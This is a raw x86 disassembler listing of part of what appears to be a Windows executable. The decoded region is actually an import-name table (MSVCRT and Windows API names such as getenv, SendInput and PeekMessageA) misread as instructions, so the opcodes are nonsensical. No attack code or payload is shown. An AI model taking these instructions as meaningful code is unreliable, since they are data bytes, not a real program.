  412698:	dec    esp
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	pop    edx
  41269d:	add    DWORD PTR cs:[eax],eax
  4126a0:	jo     0x4126d0
  4126a2:	add    DWORD PTR [eax],eax
  4126a4:	jle    0x4126d4
  4126a6:	add    DWORD PTR [eax],eax
  4126a8:	mov    ch,BYTE PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0x12e:0xae00012e
  4126b3:	add    ah,al
  4126b5:	add    DWORD PTR cs:[eax],eax
  4126b8:	aam    0x2e
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	fisubr WORD PTR [esi]
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	in     al,dx
  4126c1:	add    DWORD PTR cs:[eax],eax
  4126c4:	(bad)  
  4126c5:	add    DWORD PTR cs:[eax],eax
  4126c8:	or     al,0x2f
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	and    al,0x2f
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	ss das 
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	dec    eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	push   esi
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	fs das 
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	js     0x412711
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	mov    ch,BYTE PTR [edi]
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	pushf  
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	test   al,0x2f
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	mov    esp,0xc800012f
  4126f5:	das    
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	fisubr WORD PTR [edi]
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	repnz das 
  4126fe:	add    DWORD PTR [eax],eax
  412700:	(bad)  
  412701:	das    
  412702:	add    DWORD PTR [eax],eax
  412704:	or     BYTE PTR [eax],dh
  412706:	add    DWORD PTR [eax],eax
  412708:	push   ss
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [esi],ah
  41270d:	xor    BYTE PTR [ecx],al
  41270f:	add    BYTE PTR [esi],bh
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax+0x30],dl
  412716:	add    DWORD PTR [eax],eax
  412718:	bound  esi,QWORD PTR [eax]
  41271a:	add    DWORD PTR [eax],eax
  41271c:	outs   dx,BYTE PTR ds:[esi]
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    BYTE PTR [eax-0x71fffed0],al
  412725:	xor    BYTE PTR [ecx],al
  412727:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	mov    esi,0xcc000130
  412735:	xor    BYTE PTR [ecx],al
  412737:	add    al,bl
  412739:	xor    BYTE PTR [ecx],al
  41273b:	add    dh,ah
  41273d:	xor    BYTE PTR [ecx],al
  41273f:	add    al,bh
  412741:	xor    BYTE PTR [ecx],al
  412743:	add    BYTE PTR [esi],al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    BYTE PTR [edx],dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    BYTE PTR [ecx+esi*1],ah
  41274e:	add    DWORD PTR [eax],eax
  412750:	cmp    BYTE PTR [ecx],dh
  412752:	add    DWORD PTR [eax],eax
  412754:	dec    edx
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [edx+0x31],bl
  41275a:	add    DWORD PTR [eax],eax
  41275c:	push   0x31
  41275e:	add    DWORD PTR [eax],eax
  412760:	js     0x412793
  412762:	add    DWORD PTR [eax],eax
  412764:	xchg   esi,eax
  412765:	xor    DWORD PTR [ecx],eax
  412767:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	shl    BYTE PTR [ecx],cl
  412772:	add    DWORD PTR [eax],eax
  412774:	in     al,0x31
  412776:	add    DWORD PTR [eax],eax
  412778:	cld    
  412779:	xor    DWORD PTR [ecx],eax
  41277b:	add    BYTE PTR [edx],cl
  41277d:	xor    al,BYTE PTR [ecx]
  41277f:	add    BYTE PTR [eax],al
  412781:	add    BYTE PTR [eax],al
  412783:	add    BYTE PTR [edx+esi*1],ch
  412786:	add    DWORD PTR [eax],eax
  412788:	inc    esp
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    BYTE PTR [esi+0x32],dl
  41278e:	add    DWORD PTR [eax],eax
  412790:	outs   dx,BYTE PTR ds:[esi]
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    BYTE PTR [eax-0x63fffece],al
  412799:	xor    al,BYTE PTR [ecx]
  41279b:	add    BYTE PTR [eax],al
  41279d:	add    BYTE PTR [eax],al
  41279f:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	out    0x32,al
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cli    
  4127ad:	xor    al,BYTE PTR [ecx]
  4127af:	add    BYTE PTR [edx],cl
  4127b1:	xor    eax,DWORD PTR [ecx]
  4127b3:	add    BYTE PTR [eax],ah
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi],dh
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    BYTE PTR [ebx+esi*1+0x1],al
  4127bf:	add    BYTE PTR [eax+0x33],dl
  4127c2:	add    DWORD PTR [eax],eax
  4127c4:	pop    esp
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    BYTE PTR [esi+0x33],ah
  4127ca:	add    DWORD PTR [eax],eax
  4127cc:	je     0x412801
  4127ce:	add    DWORD PTR [eax],eax
  4127d0:	xor    BYTE PTR [ebx],0x1
  4127d3:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4127da:	add    DWORD PTR [eax],eax
  4127dc:	ret    0x133
  4127df:	add    dh,dl
  4127e1:	xor    eax,DWORD PTR [ecx]
  4127e3:	add    dh,ch
  4127e5:	xor    eax,DWORD PTR [ecx]
  4127e7:	add    ah,bh
  4127e9:	xor    eax,DWORD PTR [ecx]
  4127eb:	add    BYTE PTR [esi],dl
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [edx],ch
  4127f1:	xor    al,0x1
  4127f3:	add    BYTE PTR [esp+esi*1],dh
  4127f6:	add    DWORD PTR [eax],eax
  4127f8:	inc    esp
  4127f9:	xor    al,0x1
  4127fb:	add    BYTE PTR [esi+0x34],cl
  4127fe:	add    DWORD PTR [eax],eax
  412800:	pop    edx
  412801:	xor    al,0x1
  412803:	add    BYTE PTR [esi+0x34],ch
  412806:	add    DWORD PTR [eax],eax
  412808:	xchg   BYTE PTR [ecx+eax*1],dh
  41280b:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  412812:	add    DWORD PTR [eax],eax
  412814:	mov    dl,0x34
  412816:	add    DWORD PTR [eax],eax
  412818:	enter  0x134,0x0
  41281c:	fidiv  DWORD PTR [ecx+eax*1]
  41281f:	add    dh,ah
  412821:	xor    al,0x1
  412823:	add    dl,bh
  412825:	xor    al,0x1
  412827:	add    BYTE PTR [esi*1+0x350e0001],al
  41282e:	add    DWORD PTR [eax],eax
  412830:	push   ds
  412831:	xor    eax,0x35360001
  412836:	add    DWORD PTR [eax],eax
  412838:	dec    edx
  412839:	xor    eax,0x355a0001
  41283e:	add    DWORD PTR [eax],eax
  412840:	xor    ax,0x1
  412844:	je     0x41287b
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    dh,BYTE PTR ds:0x359c0001
  41284e:	add    DWORD PTR [eax],eax
  412850:	add    BYTE PTR [eax],al
  412852:	add    BYTE PTR [eax],al
  412854:	mov    edx,0xce000135
  412859:	xor    eax,0x35e00001
  41285e:	add    DWORD PTR [eax],eax
  412860:	in     al,dx
  412861:	xor    eax,0x36040001
  412866:	add    DWORD PTR [eax],eax
  412868:	adc    al,0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	sub    BYTE PTR [esi],dh
  41286e:	add    DWORD PTR [eax],eax
  412870:	ds add DWORD PTR ss:[eax],eax
  412874:	dec    esi
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	pusha  
  412879:	add    DWORD PTR ss:[eax],eax
  41287c:	ins    BYTE PTR es:[edi],dx
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	xor    BYTE PTR [esi],0x1
  412883:	add    BYTE PTR [esi-0x49fffeca],bl
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	retf   0x136
  41288f:	add    dl,bl
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	out    0x36,al
  412896:	add    DWORD PTR [eax],eax
  412898:	(bad)  
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	adc    BYTE PTR [edi],dh
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	and    dh,BYTE PTR [edi]
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	xor    dh,BYTE PTR [edi]
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	inc    esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	push   eax
  4128ad:	aaa    
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	pusha  
  4128b1:	aaa    
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	outs   dx,BYTE PTR ds:[esi]
  4128b5:	aaa    
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	js     0x4128f1
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    BYTE PTR [edi],dh
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	xchg   esi,eax
  4128c1:	aaa    
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	test   al,0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	mov    esi,0xd2000137
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jmp    0x138:0x137
  4128d7:	add    BYTE PTR [esi],cl
  4128d9:	cmp    BYTE PTR [ecx],al
  4128db:	add    BYTE PTR [esi],ah
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1],bh
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	dec    esp
  4128e5:	cmp    BYTE PTR [ecx],al
  4128e7:	add    BYTE PTR [eax+0x38],bl
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	jo     0x412926
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	jle    0x41292a
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	xchg   edx,eax
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [esi-0x51fffec8],bl
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dh,al
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    dl,bl
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    al,ch
  412909:	cmp    BYTE PTR [ecx],al
  41290b:	add    dh,bh
  41290d:	cmp    BYTE PTR [ecx],al
  41290f:	add    BYTE PTR [edx],dl
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [esi],bl
  412915:	cmp    DWORD PTR [ecx],eax
  412917:	add    BYTE PTR [eax],bh
  412919:	cmp    DWORD PTR [ecx],eax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412923:	add    BYTE PTR [edx+0x39],dh
  412926:	add    DWORD PTR [eax],eax
  412928:	add    BYTE PTR [eax],al
  41292a:	add    BYTE PTR [eax],al
  41292c:	xchg   edi,eax
  41292d:	add    ebp,DWORD PTR [ecx+0x73]
  412930:	imul   esp,DWORD PTR fs:[edi+0x69],0x41f0074
  412938:	ja     0x41299d
  41293a:	jae    0x41299f
  41293c:	ins    DWORD PTR es:[edi],dx
  41293d:	jo     0x41293f
  41293f:	add    ch,dh
  412941:	add    BYTE PTR [edi+0x63],bl
  412944:	outs   dx,DWORD PTR ds:[esi]
  412945:	outs   dx,BYTE PTR ds:[esi]
  412946:	je     0x4129ba
  412948:	outs   dx,DWORD PTR ds:[esi]
  412949:	ins    BYTE PTR es:[edi],dx
  41294a:	data16 jo 0x41294d
  41294d:	add    BYTE PTR [ebp+0x74656703],cl
  412953:	outs   dx,BYTE PTR gs:[esi]
  412955:	jbe    0x412957
  412957:	add    BYTE PTR ds:0x73637704,ch
  41295d:	jb     0x4129c2
  41295f:	push   0x3f20072
  412964:	jae    0x4129da
  412966:	jb     0x4129d6
  412968:	arpl   WORD PTR [eax+0x79],si
  41296b:	add    al,ch
  41296d:	add    esi,DWORD PTR [ebx+0x74]
  412970:	jb     0x4129d5
  412972:	jo     0x4129ed
  412974:	add    BYTE PTR [eax],al
  412976:	mov    bl,0x0
  412978:	pop    edi
  412979:	pop    edi
  41297a:	jae    0x4129e1
  41297c:	je     0x4129dd
  41297e:	popa   
  41297f:	jo     0x4129f1
  412981:	pop    edi
  412982:	je     0x4129fd
  412984:	jo     0x4129eb
  412986:	add    BYTE PTR [eax],al
  412988:	lds    eax,FWORD PTR [ebx]
  41298a:	jo     0x4129fe
  41298c:	imul   ebp,DWORD PTR [esi+0x74],0xcc000066
  412993:	add    esi,DWORD PTR [ecx+0x73]
  412996:	outs   dx,DWORD PTR ds:[esi]
  412997:	jb     0x412a0d
  412999:	add    BYTE PTR [edx+0x3],dh
  41299c:	data16 ins BYTE PTR es:[edi],dx
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	outs   dx,DWORD PTR ds:[esi]
  4129a0:	jb     0x4129a2
  4129a2:	lods   al,BYTE PTR ds:[esi]
  4129a3:	add    ebp,DWORD PTR [ecx+0x73]
  4129a6:	js     0x412a0c
  4129a8:	imul   esp,DWORD PTR [edi+0x69],0xa0000074
  4129af:	add    BYTE PTR [edi+0x5f],bl
  4129b2:	jo     0x412a13
  4129b4:	pop    edi
  4129b5:	ins    WORD PTR es:[edi],dx
  4129b7:	outs   dx,DWORD PTR ds:[esi]
  4129b8:	fs add BYTE PTR gs:[eax],al
  4129bc:	xor    eax,0x73637704
  4129c1:	je     0x412a32
  4129c3:	ins    BYTE PTR es:[edi],dx
  4129c4:	add    BYTE PTR [eax],al
  4129c6:	or     al,0x4
  4129c8:	je     0x412a39
  4129ca:	ja     0x412a41
  4129cc:	jo     0x412a3e
  4129ce:	gs jb  0x4129d1
  4129d1:	add    cl,dh
  4129d3:	add    esi,DWORD PTR [ebx+0x74]
  4129d6:	jb     0x412a46
  4129d8:	arpl   WORD PTR [ebp+0x70],bp
  4129db:	add    BYTE PTR [ebx+0x705f5f00],bl
  4129e1:	pop    edi
  4129e2:	pop    edi
  4129e3:	arpl   WORD PTR [edi+0x6d],bp
  4129e6:	ins    DWORD PTR es:[edi],dx
  4129e7:	outs   dx,DWORD PTR ds:[esi]
  4129e8:	fs add BYTE PTR gs:[eax],al
  4129ec:	push   es
  4129ed:	add    al,0x74
  4129ef:	imul   ebp,DWORD PTR [ebp+0x65],0x38b0000
  4129f6:	addr16 gs je 0x412a5d
  4129fa:	add    BYTE PTR [eax],al
  4129fc:	xor    eax,DWORD PTR [edi+esi*2]
  4129ff:	arpl   WORD PTR [ebx+0x74],si
  412a02:	outs   dx,DWORD PTR ds:[esi]
  412a03:	imul   eax,DWORD PTR [eax],0x0
  412a06:	test   eax,0x77736903
  412a0b:	jae    0x412a7d
  412a0d:	popa   
  412a0e:	arpl   WORD PTR [ebp+0x0],sp
  412a11:	add    BYTE PTR [ebx+0x77736903],ch
  412a17:	js     0x412a7d
  412a19:	imul   esp,DWORD PTR [edi+0x69],0xdb0074
  412a20:	pop    edi
  412a21:	popa   
  412a22:	ins    DWORD PTR es:[edi],dx
  412a23:	jae    0x412a8c
  412a25:	pop    edi
  412a26:	gs js  0x412a92
  412a29:	je     0x412a2b
  412a2b:	add    BYTE PTR [ecx],ah
  412a2d:	add    al,0x77
  412a2f:	arpl   WORD PTR [ebx+0x63],si
  412a32:	jo     0x412aad
  412a34:	add    BYTE PTR [eax],al
  412a36:	xchg   BYTE PTR [ecx],al
  412a38:	pop    edi
  412a39:	imul   ebp,DWORD PTR [esi+0x69],0x72657474
  412a40:	ins    DWORD PTR es:[edi],dx
  412a41:	add    BYTE PTR [ebx+eax*1+0x6c617369],dl
  412a48:	outs   dx,BYTE PTR ds:[esi]
  412a49:	jne    0x412ab8
  412a4b:	add    ch,dh
  412a4d:	add    esi,DWORD PTR [ebx+0x74]
  412a50:	jb     0x412ac2
  412a52:	bound  esi,QWORD PTR [edx+0x6b]
  412a55:	add    BYTE PTR [esi+0x73695f01],bl
  412a5b:	ins    DWORD PTR es:[edi],dx
  412a5c:	bound  esp,QWORD PTR [edx+0x6c]
  412a5f:	gs popa 
  412a61:	add    BYTE PTR fs:[eax],al
  412a64:	sbb    BYTE PTR [esi+esi*2],al
  412a67:	jae    0x412ae0
  412a69:	jo     0x412add
  412a6b:	imul   ebp,DWORD PTR [esi+0x74],0x36d0066
  412a72:	data16 addr16 gs je 0x412ada
  412a77:	add    BYTE PTR [edx+0x0],dl
  412a7a:	pop    edi
  412a7b:	pop    eax
  412a7c:	arpl   WORD PTR [eax+0x74],si
  412a7f:	inc    esi
  412a80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4290072
  412a88:	ja     0x412aed
  412a8a:	jae    0x412afa
  412a8c:	arpl   WORD PTR [eax+0x79],si
  412a8f:	add    BYTE PTR [ebx],ah
  412a91:	add    DWORD PTR [edi+0x65],ebx
  412a94:	js     0x412aff
  412a96:	je     0x412a98
  412a98:	imul   eax,DWORD PTR [ebx],0x6f6c6366
  412a9e:	jae    0x412b05
  412aa0:	add    BYTE PTR [eax],al
  412aa2:	call   0x65a489a7
  412aa7:	js     0x412b12
  412aa9:	je     0x412aab
  412aab:	add    bh,al
  412aad:	add    esi,DWORD PTR [eax+0x75]
  412ab0:	je     0x412b15
  412ab2:	add    BYTE PTR [eax],al
  412ab4:	fadd   DWORD PTR [ebx]
  412ab6:	jae    0x412b1d
  412ab8:	je     0x412b26
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	arpl   WORD PTR [ecx+0x6c],sp
  412abe:	add    BYTE PTR gs:[ebp+0x735f5f00],dh
  412ac5:	gs je  0x412b3d
  412ac8:	jae    0x412b2f
  412aca:	jb     0x412b39
  412acc:	popa   
  412acd:	je     0x412b37
  412acf:	gs jb  0x412b44
  412ad2:	add    BYTE PTR [eax],al
  412ad4:	mov    BYTE PTR [ebx],al
  412ad6:	data16 ja 0x412b4b
  412ad9:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x7003c300
  412ae1:	gs jb  0x412b56
  412ae4:	outs   dx,DWORD PTR ds:[esi]
  412ae5:	jb     0x412ae7
  412ae7:	add    BYTE PTR [edx+0x3],bl
  412aea:	popa   
  412aeb:	je     0x412b5c
  412aed:	ins    BYTE PTR es:[edi],dx
  412aee:	add    BYTE PTR [eax],al
  412af0:	jb     0x412af2
  412af2:	pop    edi
  412af3:	pop    edi
  412af4:	addr16 gs je 0x412b65
  412af8:	popa   
  412af9:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b00:	sub    BYTE PTR [edi+esi*2],al
  412b03:	arpl   WORD PTR [ebx+0x6e],si
  412b06:	arpl   WORD PTR [ebp+0x70],bp
  412b09:	add    dl,dl
  412b0b:	add    esi,DWORD PTR [edx+0x65]
  412b0e:	ins    DWORD PTR es:[edi],dx
  412b0f:	outs   dx,DWORD PTR ds:[esi]
  412b10:	jbe    0x412b77
  412b12:	add    BYTE PTR [eax],al
  412b14:	dec    ebp
  412b15:	push   ebx
  412b16:	push   esi
  412b17:	inc    ebx
  412b18:	push   edx
  412b19:	push   esp
  412b1a:	cs fs ins BYTE PTR es:[edi],dx
  412b1d:	ins    BYTE PTR es:[edi],dx
  412b1e:	add    BYTE PTR [eax],al
  412b20:	mov    edi,0x636f4c01
  412b25:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412b29:	outs   dx,DWORD PTR fs:[esi]
  412b2b:	ja     0x412b82
  412b2d:	jo     0x412b93
  412b2f:	popa   
  412b30:	je     0x412b97
  412b32:	add    BYTE PTR [eax],al
  412b34:	nop
  412b35:	add    dl,BYTE PTR [edx+esi*2+0x61]
  412b39:	arpl   WORD PTR [ebx+0x50],bp
  412b3c:	outs   dx,DWORD PTR ds:[esi]
  412b3d:	jo     0x412bb4
  412b3f:	jo     0x412b8e
  412b41:	outs   dx,BYTE PTR gs:[esi]
  412b43:	jne    0x412b45
  412b45:	add    BYTE PTR [eax],bh
  412b47:	add    dl,BYTE PTR [ebx+0x65]
  412b4a:	je     0x412b8f
  412b4c:	jne    0x412bc0
  412b4e:	jae    0x412bbf
  412b50:	jb     0x412b52
  412b52:	mov    eax,ds:0x57734901
  412b57:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412b5e:	popa   
  412b5f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412b63:	add    BYTE PTR [ecx+0x536e4901],al
  412b69:	outs   dx,BYTE PTR gs:[esi]
  412b6b:	fs dec ebp
  412b6d:	gs jae 0x412be3
  412b70:	popa   
  412b71:	addr16 gs inc ebp
  412b74:	js     0x412b76
  412b76:	xchg   ebx,eax
  412b77:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412b7b:	je     0x412bef
  412b7d:	outs   dx,DWORD PTR ds:[esi]
  412b7e:	jns    0x412bc1
  412b80:	arpl   WORD PTR [ebx+0x65],sp
  412b83:	ins    BYTE PTR es:[edi],dx
  412b84:	gs jb  0x412be8
  412b87:	je     0x412bf8
  412b89:	jb     0x412bdf
  412b8b:	popa   
  412b8c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b90:	adc    eax,DWORD PTR [ecx]
  412b92:	inc    edi
  412b93:	gs je  0x412bda
  412b96:	outs   dx,DWORD PTR ds:[esi]
  412b97:	jne    0x412bfb
  412b99:	ins    BYTE PTR es:[edi],dx
  412b9a:	gs inc ebx
  412b9c:	ins    BYTE PTR es:[edi],dx
  412b9d:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412ba4:	add    BYTE PTR [eax],al
  412ba6:	mov    ds:0x57734901,eax
  412bab:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  412bb2:	jae    0x412c1d
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	mov    al,0x1
  412bba:	dec    esp
  412bbb:	outs   dx,DWORD PTR ds:[esi]
  412bbc:	popa   
  412bbd:	fs dec ecx
  412bbf:	arpl   WORD PTR [edi+0x6e],bp
  412bc2:	push   edi
  412bc3:	add    BYTE PTR [ebp+0x79656b02],bh
  412bc9:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  412bcd:	jbe    0x412c34
  412bcf:	outs   dx,BYTE PTR ds:[esi]
  412bd0:	je     0x412bd2
  412bd2:	test   eax,0x616f4c01
  412bd7:	fs inc edx
  412bd9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x58004170
  412be1:	add    dl,BYTE PTR [ebx+0x65]
  412be4:	je     0x412c38
  412be6:	arpl   WORD PTR gs:[eax+eax*1-0x1e],si
  412beb:	add    BYTE PTR [esi+0x69],al
  412bee:	outs   dx,BYTE PTR ds:[esi]
  412bef:	fs push edi
  412bf1:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412bf8:	inc    ecx
  412bf9:	add    cl,bh
  412bfb:	add    BYTE PTR [edi+0x65],al
  412bfe:	je     0x412c43
  412c00:	ins    BYTE PTR es:[edi],dx
  412c01:	popa   
  412c02:	jae    0x412c77
  412c04:	dec    esp
  412c05:	outs   dx,DWORD PTR ds:[esi]
  412c06:	outs   dx,BYTE PTR ds:[esi]
  412c07:	addr16 push edi
  412c09:	add    BYTE PTR ds:0x6e655302,ah
  412c0f:	fs dec ecx
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	jo     0x412c89
  412c14:	je     0x412c16
  412c16:	cdq    
  412c17:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412c1b:	ins    BYTE PTR es:[edi],dx
  412c1c:	outs   dx,DWORD PTR ds:[esi]
  412c1d:	addr16 inc edx
  412c1f:	outs   dx,DWORD PTR ds:[esi]
  412c20:	js     0x412c6b
  412c22:	outs   dx,BYTE PTR ds:[esi]
  412c23:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	inc    ecx
  412c2f:	add    BYTE PTR [edi+0x70737702],bh
  412c35:	jb     0x412ca0
  412c37:	outs   dx,BYTE PTR ds:[esi]
  412c38:	je     0x412ca0
  412c3a:	inc    ecx
  412c3b:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  412c42:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x654700f8
  412c4a:	je     0x412c8f
  412c4c:	ins    BYTE PTR es:[edi],dx
  412c4d:	popa   
  412c4e:	jae    0x412cc3
  412c50:	dec    esp
  412c51:	outs   dx,DWORD PTR ds:[esi]
  412c52:	outs   dx,BYTE PTR ds:[esi]
  412c53:	addr16 inc ecx
  412c55:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  412c5c:	outs   dx,DWORD PTR ds:[esi]
  412c5d:	outs   dx,BYTE PTR ds:[esi]
  412c5e:	imul   esp,DWORD PTR [ebx+0x0],0x47014200
  412c65:	gs je  0x412cb6
  412c68:	gs js  0x412cdf
  412c6b:	inc    esp
  412c6c:	ins    BYTE PTR es:[edi],dx
  412c6d:	addr16 inc edi
  412c6f:	jb     0x412ce0
  412c71:	jne    0x412ce3
  412c73:	dec    ecx
  412c74:	je     0x412cdb
  412c76:	ins    DWORD PTR es:[edi],dx
  412c77:	add    BYTE PTR [ebx+0x61724400],dh
  412c7d:	ja     0x412cc8
  412c7f:	arpl   WORD PTR [edi+0x6e],bp
  412c82:	add    BYTE PTR [eax],al
  412c84:	jmp    0x65b17b8a
  412c89:	outs   dx,BYTE PTR ds:[esi]
  412c8a:	dec    ecx
  412c8b:	outs   dx,BYTE PTR ds:[esi]
  412c8c:	jo     0x412d03
  412c8e:	je     0x412cd4
  412c90:	gs jae 0x412cfe
  412c93:	je     0x412d04
  412c95:	jo     0x412c97
  412c97:	add    dh,bh
  412c99:	add    BYTE PTR [edi+0x65],al
  412c9c:	je     0x412ce1
  412c9e:	ins    BYTE PTR es:[edi],dx
  412c9f:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412ca6:	jb     0x412ca8
  412ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca9:	add    DWORD PTR [ecx+0x73],ecx
  412cac:	pop    edx
  412cad:	outs   dx,DWORD PTR ds:[esi]
  412cae:	outs   dx,DWORD PTR ds:[esi]
  412caf:	ins    DWORD PTR es:[edi],dx
  412cb0:	gs add BYTE PTR fs:[eax],al
  412cb4:	rol    DWORD PTR [eax],0x45
  412cb7:	outs   dx,BYTE PTR ds:[esi]
  412cb8:	popa   
  412cb9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cbd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412cc4:	sub    BYTE PTR [eax],al
  412cc6:	inc    ebx
  412cc7:	push   0x6f4c7261
  412ccc:	ja     0x412d33
  412cce:	jb     0x412d12
  412cd0:	jne    0x412d38
  412cd2:	push   di
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	inc    ebx
  412cd7:	add    BYTE PTR [ebx+0x6c],al
  412cda:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  412ce1:	arpl   WORD PTR [edx+0x65],si
  412ce4:	outs   dx,BYTE PTR gs:[esi]
  412ce6:	add    BYTE PTR [eax],al
  412ce8:	add    eax,DWORD PTR [eax]
  412cea:	inc    ecx
  412ceb:	fs push 0x75
  412cee:	jae    0x412d64
  412cf0:	push   edi
  412cf1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412cf8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412cfc:	add    BYTE PTR [eax],al
  412cfe:	icebp  
  412cff:	add    DWORD PTR [eax+0x6f],edx
  412d02:	jae    0x412d78
  412d04:	dec    ebp
  412d05:	gs jae 0x412d7b
  412d08:	popa   
  412d09:	addr16 gs inc ecx
  412d0c:	add    BYTE PTR [eax],al
  412d0e:	out    dx,al
  412d0f:	add    DWORD PTR [eax+0x65],edx
  412d12:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412d17:	jae    0x412d7a
  412d19:	addr16 gs inc ecx
  412d1c:	add    BYTE PTR [eax],al
  412d1e:	dec    ebx
  412d1f:	add    DWORD PTR [edi+0x65],eax
  412d22:	je     0x412d74
  412d24:	jb     0x412d95
  412d26:	jo     0x412d7f
  412d28:	add    BYTE PTR [eax],al
  412d2a:	inc    esi
  412d2b:	add    BYTE PTR [ebx+0x6c],al
  412d2e:	outs   dx,DWORD PTR ds:[esi]
  412d2f:	jae    0x412d96
  412d31:	inc    esp
  412d32:	gs jae 0x412da0
  412d35:	je     0x412da6
  412d37:	jo     0x412d39
  412d39:	add    cl,cl
  412d3b:	add    DWORD PTR [ebp+0x61],ecx
  412d3e:	jo     0x412d97
  412d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412d47:	imul   ebp,DWORD PTR [esi+0x74],0x2020073
  412d4e:	push   edx
  412d4f:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  412d58:	popa   
  412d59:	jae    0x412dce
  412d5b:	inc    ecx
